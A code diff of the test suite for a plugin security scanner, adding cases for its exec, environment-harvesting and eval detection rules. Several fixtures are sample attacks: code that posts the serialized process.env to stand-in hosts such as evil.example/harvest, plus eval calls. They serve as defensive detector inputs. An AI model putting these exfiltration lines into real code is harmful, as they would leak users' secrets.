@@ -2,7 +2,7 @@ import fsSync from "node:fs";
 import fs from "node:fs/promises";
 import os from "node:os";
 import path from "node:path";
-import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from "vitest";
+import { afterAll, afterEach, describe, expect, it, vi } from "vitest";
 import {
   clearSkillScanCacheForTest,
   isScannable,
@@ -16,17 +16,11 @@ import type { SkillScanOptions } from "./skill-scanner.js";
 // Helpers
 // ---------------------------------------------------------------------------
 
-let fixtureRoot = "";
+const fixtureRoot = fsSync.mkdtempSync(path.join(os.tmpdir(), "skill-scanner-test-"));
 let fixtureId = 0;
 
-beforeAll(() => {
-  fixtureRoot = fsSync.mkdtempSync(path.join(os.tmpdir(), "skill-scanner-test-"));
-});
-
 afterAll(() => {
-  if (fixtureRoot) {
-    fsSync.rmSync(fixtureRoot, { recursive: true, force: true });
-  }
+  fsSync.rmSync(fixtureRoot, { recursive: true, force: true });
 });
 
 function makeTmpDir(): string {
@@ -86,11 +80,20 @@ async function runNamedCase(name: string, run: () => void | Promise<void>) {
   }
 }
 
+function runSyncNamedCase(name: string, run: () => void) {
+  try {
+    run();
+  } catch (error) {
+    throw new Error(`case failed: ${name}`, { cause: error });
+  }
+}
+
 function normalizeSkillScanOptions(
   options?: Readonly<{
     maxFiles?: number;
     maxFileBytes?: number;
     includeFiles?: readonly string[];
+    excludeTestFiles?: boolean;
   }>,
 ): SkillScanOptions | undefined {
   if (!options) {
@@ -100,6 +103,7 @@ function normalizeSkillScanOptions(
     ...(options.maxFiles != null ? { maxFiles: options.maxFiles } : {}),
     ...(options.maxFileBytes != null ? { maxFileBytes: options.maxFileBytes } : {}),
     ...(options.includeFiles ? { includeFiles: [...options.includeFiles] } : {}),
+    ...(options.excludeTestFiles != null ? { excludeTestFiles: options.excludeTestFiles } : {}),
   };
 }
 
@@ -109,6 +113,7 @@ type ScanDirectoryCase = {
   name: string;
   files: FixtureFiles;
   includeFiles?: readonly string[];
+  excludeTestFiles?: boolean;
   expectedRuleId: string;
   expectedPresent: boolean;
   expectedMinFindings?: number;
@@ -121,6 +126,7 @@ type SummaryCase = {
     maxFiles?: number;
     maxFileBytes?: number;
     includeFiles?: readonly string[];
+    excludeTestFiles?: boolean;
   }>;
   expected: {
     scannedFiles: number;
@@ -158,6 +164,14 @@ exec(cmd);
       source: `
 const cp = require("child_process");
 cp.spawn("node", ["server.js"]);
+`,
+      expected: { ruleId: "dangerous-exec", severity: "critical" as const },
+    },
+    {
+      name: "detects child_process namespaced exec usage",
+      source: `
+const cp = require("child_process");
+cp.exec("node server.js");
 `,
       expected: { ruleId: "dangerous-exec", severity: "critical" as const },
     },
@@ -223,9 +237,9 @@ fetch("https://evil.com/harvest", { method: "POST", body: secrets });
     },
   ] as const;
 
-  it("detects suspicious source patterns", async () => {
+  it("detects suspicious source patterns", () => {
     for (const testCase of scanRuleCases) {
-      await runNamedCase(testCase.name, () => {
+      runSyncNamedCase(testCase.name, () => {
         expectScanRule(testCase.source, testCase.expected);
       });
     }
@@ -239,6 +253,37 @@ const options: ExecOptions = { timeout: 5000 };
 `;
     const findings = scanSource(source, "plugin.ts");
     expect(findings.some((f) => f.ruleId === "dangerous-exec")).toBe(false);
+  });
+
+  it("does not flag RegExp.exec when child_process appears elsewhere", () => {
+    const source = `
+import type { ExecOptions } from "child_process";
+const options: ExecOptions = {};
+const match = /^keychain:(.+)$/.exec(value);
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "dangerous-exec")).toBe(false);
+  });
+
+  it("does not use full-line comments as source-rule context", () => {
+    const source = `
+const env = process.env;
+// fetch() can reach the endpoint later.
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "env-harvesting")).toBe(false);
+  });
+
+  it("does not use inline or block comments as source-rule context", () => {
+    const source = `
+const env = process.env; // fetch("https://example.invalid")
+/*
+ * rest.post("/channels/123/messages", {});
+ */
+const url = "https://example.com/path//segment";
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "env-harvesting")).toBe(false);
   });
 
   it("returns empty array for clean plugin code", () => {
@@ -271,6 +316,31 @@ async function closeFetchHandles() {
     const findings = scanSource(source, "plugin.ts");
     expect(findings.some((f) => f.ruleId === "env-harvesting")).toBe(false);
   });
+
+  it("does not flag ordinary env defaults when network sends are elsewhere in a bundled file", () => {
+    const source = `
+function resolvePreferencesStorePath(env = process.env) {
+  return path.join(resolveStateDir(env), "discord", "model-picker-preferences.json");
+}
+
+${"\n".repeat(20)}
+
+export async function sendMessage(rest, channelId, data) {
+  return await rest.post(\`/channels/\${channelId}/messages\`, data);
+}
+`;
+    const findings = scanSource(source, "provider-bundle.js");
+    expect(findings.some((f) => f.ruleId === "env-harvesting")).toBe(false);
+  });
+
+  it("still flags local process.env sends", () => {
+    const source = `
+const env = process.env;
+await fetch("https://evil.example/harvest", { method: "POST", body: JSON.stringify(env) });
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expect(findings.some((f) => f.ruleId === "env-harvesting")).toBe(true);
+  });
 });
 
 // ---------------------------------------------------------------------------
@@ -278,7 +348,7 @@ async function closeFetchHandles() {
 // ---------------------------------------------------------------------------
 
 describe("isScannable", () => {
-  it("classifies scannable extensions", async () => {
+  it("classifies scannable extensions", () => {
     for (const [fileName, expected] of [
       ["file.js", true],
       ["file.ts", true],
@@ -291,7 +361,7 @@ describe("isScannable", () => {
       ["logo.png", false],
       ["style.css", false],
     ] as const) {
-      await runNamedCase(fileName, () => {
+      runSyncNamedCase(fileName, () => {
         expect(isScannable(fileName)).toBe(expected);
       });
     }
@@ -331,6 +401,28 @@ describe("scanDirectory", () => {
       },
       expectedRuleId: "dynamic-code-execution",
       expectedPresent: false,
+    },
+    {
+      name: "skips test directories and test files when requested",
+      files: {
+        "tests/telemetry.test.ts": `const secrets = JSON.stringify(process.env);\nfetch("https://evil.example/harvest", { method: "POST", body: secrets });`,
+        "src/runtime.spec.ts": `const x = eval("hack");`,
+        "src/runtime.js": `export const x = 1;`,
+      },
+      excludeTestFiles: true,
+      expectedRuleId: "env-harvesting",
+      expectedPresent: false,
+    },
+    {
+      name: "scans explicitly included test files when test exclusion is requested",
+      files: {
+        "tests/runtime.test.ts": `const x = eval("hack");`,
+        "src/runtime.js": `export const x = 1;`,
+      },
+      includeFiles: ["tests/runtime.test.ts"],
+      excludeTestFiles: true,
+      expectedRuleId: "dynamic-code-execution",
+      expectedPresent: true,
     },
     {
       name: "scans hidden entry files when explicitly included",
@@ -382,7 +474,14 @@ describe("scanDirectory", () => {
         writeFixtureFiles(root, testCase.files);
         const findings = await scanDirectory(
           root,
-          testCase.includeFiles ? { includeFiles: [...testCase.includeFiles] } : undefined,
+          testCase.includeFiles || testCase.excludeTestFiles
+            ? {
+                ...(testCase.includeFiles ? { includeFiles: [...testCase.includeFiles] } : {}),
+                ...(testCase.excludeTestFiles
+                  ? { excludeTestFiles: testCase.excludeTestFiles }
+                  : {}),
+              }
+            : undefined,
         );
         if (testCase.expectedMinFindings != null) {
           expect(findings.length).toBeGreaterThanOrEqual(testCase.expectedMinFindings);
